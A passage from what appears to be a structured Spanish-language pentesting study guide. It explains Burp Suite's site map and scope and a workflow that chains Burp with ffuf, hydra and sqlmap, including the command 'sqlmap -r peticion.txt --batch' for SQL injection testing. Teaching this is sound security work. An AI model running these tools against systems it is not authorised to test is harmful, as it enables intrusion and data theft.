                "idea": "La pestaña Target > Site map construye un árbol de todo lo que has tocado (rutas, parámetros, ficheros). Define un Scope (click derecho sobre el host > Add to scope) para que Burp registre SOLO tu objetivo y no ruido de terceros. Si navegas la web con el proxy puesto (e incluso pasas ffuf a través de Burp), el site map se llena solo y afloran endpoints que no viste en el navegador.",
                "commands": [],
                "look": "Rutas y endpoints ocultos: llamadas AJAX, endpoints de API, ficheros .js que listan rutas dentro.",
                "decide": "Endpoint de API o parámetro nuevo -> a Repeater a probarlo. Fichero JS -> ábrelo, suele revelar rutas y claves.",
            },
            {
                "title": "Cuándo Burp y cuándo otra cosa (flujo)",
                "idea": "Burp no reemplaza a ffuf ni a sqlmap; los complementa. Flujo típico: navegas con el proxy puesto para llenar el site map, detectas peticiones interesantes, las llevas a Repeater para entenderlas y tantear bugs a mano, y cuando algo se repite lo automatizas. Puedes incluso encadenar sqlmap guardando la petición desde Burp (click derecho > Save item) y pasándosela con -r, para que herede cookies y cabeceras exactas.",
                "commands": [
                    {
                        "cmd": "sqlmap -r peticion.txt --batch",
                        "why": "Guardas la petición real desde Burp (Save item) y se la das a sqlmap con -r: hereda método, cookies y cabeceras sin reconstruirla a mano.",
                        "out": "sqlmap prueba la inyección sobre esa petición exacta; ideal para SQLi tras un login o en una API con cabeceras específicas.",
                    },
                ],
                "look": "Qué parte del trabajo es manual/exploratoria (Burp) y cuál es repetitiva/masiva (herramientas de línea de comandos).",
                "decide": "Manual y exploratorio -> Burp/Repeater. Fuzzing o fuerza bruta masiva -> ffuf/hydra. Explotar una SQLi ya confirmada -> sqlmap -r con la petición de Burp.",
            },
        ],
    },
]
